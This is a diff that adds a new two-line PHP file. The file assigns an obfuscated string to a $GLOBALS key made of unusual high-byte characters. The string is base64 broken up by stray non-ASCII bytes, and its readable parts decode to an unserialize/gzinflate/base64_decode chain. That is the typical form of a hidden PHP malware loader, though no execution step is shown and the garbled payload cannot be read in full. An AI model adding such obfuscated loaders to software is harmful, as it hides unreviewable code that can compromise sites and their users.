@@ -1,0 +1,2 @@
+<?php
+$GLOBALS['_´µ¶'] = 'JF9FTlZ7IuIZIn0gPSB1bnNülcmlhbGl6ZSèhnemlu³ZmxhdGUoYmÊFzZTY0 X2RñlY29kZSgnU¦zdReXNûxb3VCaEpLYjg0c‡VÍdSZøGJHUnBiS‡1RrbUo2YÉ1dGeXU0cE9abHBxYUÔFCY£TJVSm9Cb1V5cº2¢xUŽNz¼kÐ0VDƒBjbDYx b0EnÆKSkÚpOw==';
